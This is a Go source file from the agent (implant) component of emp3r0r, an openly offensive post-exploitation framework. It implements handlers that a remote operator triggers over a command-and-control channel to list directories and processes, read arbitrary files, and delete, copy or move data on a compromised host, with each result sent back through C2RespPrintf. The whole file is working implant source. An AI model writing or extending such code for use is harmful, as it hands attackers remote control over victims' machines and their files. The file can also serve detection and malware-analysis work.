package agent

import (
	"log"
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
	"github.com/spf13/cobra"
)

func lsCmdRun(cmd *cobra.Command, args []string) {
	// Lists the contents of the specified directory.
	target_dir, _ := cmd.Flags().GetString("dst")
	log.Printf("Listing %s", target_dir)
	out, err := util.LsPath(target_dir)
	if err != nil {
		out = err.Error()
	}

	C2RespPrintf(cmd, "%s", out)
}

func psCmdRun(cmd *cobra.Command, args []string) {
	// Lists all running processes.
	pid, _ := cmd.Flags().GetInt("pid")
	name, _ := cmd.Flags().GetString("name")
	user, _ := cmd.Flags().GetString("user")
	cmdLine, _ := cmd.Flags().GetString("cmdline")
	out, err := ps(pid, user, name, cmdLine)
	if err != nil {
		C2RespPrintf(cmd, "Failed to ps: %v", err)
		return
	}
	C2RespPrintf(cmd, "%s", out)
}

// catCmdRun reads and sends the contents of the specified file.
func catCmdRun(cmd *cobra.Command, args []string) {
	targetFile, _ := cmd.Flags().GetString("dst")
	if targetFile == "" {
		C2RespPrintf(cmd, "error: no file specified")
		return
	}
	out, err := util.DumpFile(targetFile)
	if err != nil {
		C2RespPrintf(cmd, "%v", err)
		return
	}
	C2RespPrintf(cmd, "%s", out)
}

// rmCmdRun deletes the specified file or directory.
func rmCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := os.RemoveAll(path); err != nil {
		C2RespPrintf(cmd, "Failed to delete %s: %v", path, err)
		return
	}
	C2RespPrintf(cmd, "Deleted %s", path)
}

// mkdirCmdRun creates a directory with mode 0700.
func mkdirCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := os.MkdirAll(path, 0700); err != nil {
		C2RespPrintf(cmd, "Failed to mkdir %s: %v", path, err)
		return
	}
	C2RespPrintf(cmd, "Mkdir %s", path)
}

// cpCmdRun copies a file or directory from source to destination.
func cpCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := copy.Copy(src, dst); err != nil {
		C2RespPrintf(cmd, "Failed to copy %s to %s: %v", src, dst, err)
		return
	}
	C2RespPrintf(cmd, "%s has been copied to %s", src, dst)
}

// mvCmdRun moves a file or directory from source to destination.
func mvCmdRun(cmd *cobra.Command, args []string) {
	src, _ := cmd.Flags().GetString("src")
	dst, _ := cmd.Flags().GetString("dst")
	if src == "" || dst == "" {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := os.Rename(src, dst); err != nil {
		C2RespPrintf(cmd, "Failed to move %s to %s: %v", src, dst, err)
		return
	}
	C2RespPrintf(cmd, "%s has been moved to %s", src, dst)
}

// cdCmdRun changes the working directory.
func cdCmdRun(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("dst")
	if path == "" {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	cdPath, err := filepath.Abs(path)
	if err != nil {
		C2RespPrintf(cmd, "cd error: %v", err)
		return
	}
	if err = os.Chdir(cdPath); err != nil {
		C2RespPrintf(cmd, "cd error: %v", err)
		return
	}
	C2RespPrintf(cmd, "%s", cdPath)
}

// pwdCmdRun prints the current working directory.
func pwdCmdRun(cmd *cobra.Command, args []string) {
	pwd, err := os.Getwd()
	if err != nil {
		C2RespPrintf(cmd, "pwd error: %v", err)
		return
	}
	C2RespPrintf(cmd, "current working directory: %s", pwd)
}
